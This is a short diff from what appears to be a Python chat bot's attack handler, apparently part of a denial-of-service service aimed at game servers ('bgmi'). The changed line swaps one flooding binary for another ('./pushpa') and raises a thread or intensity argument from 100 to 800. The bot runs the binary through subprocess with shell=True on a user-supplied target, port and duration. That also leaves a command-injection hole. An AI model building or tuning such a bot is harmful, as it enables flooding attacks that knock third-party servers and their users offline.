@@ -268,7 +268,7 @@ def handle_attack(message):
             )
 
             # Execute attack command
-            full_command = f"./S4 {target} {port} {attack_time} 100"
+            full_command = f"./pushpa {target} {port} {attack_time} 800"
             subprocess.run(full_command, shell=True)
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
